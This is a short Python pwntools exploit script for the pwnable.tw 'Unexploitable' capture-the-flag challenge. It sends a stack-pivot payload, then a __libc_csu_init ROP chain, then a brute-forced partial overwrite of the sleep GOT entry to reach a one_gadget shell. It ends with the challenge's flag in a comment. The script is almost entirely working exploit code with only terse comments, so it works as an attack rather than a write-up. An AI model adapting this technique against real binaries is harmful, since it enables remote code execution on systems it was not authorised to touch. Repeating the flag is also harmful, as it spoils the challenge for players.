from pwn import *

r = remote('chall.pwnable.tw',10403)
#r = process('./U',env={"LD_PRELOAD" : "./libc-2.23.so"})
'''
  4005e6:       48 8b 5c 24 08          mov    rbx,QWORD PTR [rsp+0x8]
  4005eb:       48 8b 6c 24 10          mov    rbp,QWORD PTR [rsp+0x10]
  4005f0:       4c 8b 64 24 18          mov    r12,QWORD PTR [rsp+0x18]
  4005f5:       4c 8b 6c 24 20          mov    r13,QWORD PTR [rsp+0x20]
  4005fa:       4c 8b 74 24 28          mov    r14,QWORD PTR [rsp+0x28]
  4005ff:       4c 8b 7c 24 30          mov    r15,QWORD PTR [rsp+0x30]
  400604:       48 83 c4 38             add    rsp,0x38
  400608:       c3                      ret
'''
r.wait(3.1)
payload = p64(0) * 2 + p64(0x601038) + p64(0x40055b)
r.send(payload)

payload = p64(0x400551) ##
payload += p64(0)
payload += p64(0)
payload += p64(0x4005e6) ## ret to csu 
payload += p64(0)
payload += p64(0) # rbx
payload += p64(0x601020) #rbp
payload += p64(0) #r12
payload += p64(0) #r13
payload += p64(0) #r14
payload += p64(0) #r15
payload += p64(0x40055b) # ret
r.wait(0.1)
r.send(payload)

r.wait(0.1)
### 1/16 partial overwrite sleep to execvpe one_gadget conditoin rax=0 & r12=0
r.send(b'\x18\x66') 
r.interactive()

#FLAG{4_r34lLy_Un3Xpl01T48l3_S3Rv1C3_Sh0UlD_n0T_H4v3_SYsC4ll_1NS1D3}